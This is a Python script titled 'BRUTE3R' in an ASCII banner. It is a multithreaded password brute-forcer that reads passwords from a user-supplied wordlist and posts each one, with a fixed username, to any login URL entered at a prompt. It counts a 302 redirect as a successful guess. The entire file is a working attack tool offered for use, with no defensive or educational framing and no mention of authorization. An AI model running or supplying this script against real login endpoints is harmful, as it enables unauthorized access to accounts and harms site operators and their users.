import requests
import threading
x="""
██████╗ ██████╗ ██╗   ██╗████████╗██████╗ ██████╗ 
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝╚════██╗██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║    █████╔╝██████╔╝
██╔══██╗██╔══██╗██║   ██║   ██║    ╚═══██╗██╔══██╗
██████╔╝██║  ██║╚██████╔╝   ██║   ██████╔╝██║  ██║  By <Sale7>       
"""
print(x)
def brute_force(lock, Url):
    global file1
    while True:
        with lock:
            password = file1.readline().strip()  # Read and strip whitespace
            if not password:
                break  # No more passwords in the file
        # Construct payload with current password
        Payloads = {
            "username": "sale7sa",
            "password": password
        }
        # Send POST request
        BruteRequest = requests.post(Url, data=Payloads, allow_redirects=False)
        # Print response status code
        print("Response Code:", BruteRequest.status_code, "Password:", password)
        # Check if password is correct
        if BruteRequest.status_code == 302:
            print("Correct password found:", password)
            found_passwords.append(password)

if __name__ == "__main__":
    Url = input("Enter the URL of the website/endpoint you want to brute force: ")
    if not Url.startswith("https://"):
        Url = "https://" + Url
    Namef = input("Enter the name of the file that has list of passwords: ")

    found_passwords = []
    lock = threading.Lock()

    with open(Namef + ".txt", "r") as file1:
        threads = []
        for _ in range(10):  # Adjust the number of threads as needed
            thread = threading.Thread(target=brute_force, args=(lock, Url))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    print("####Brute force attack completed####")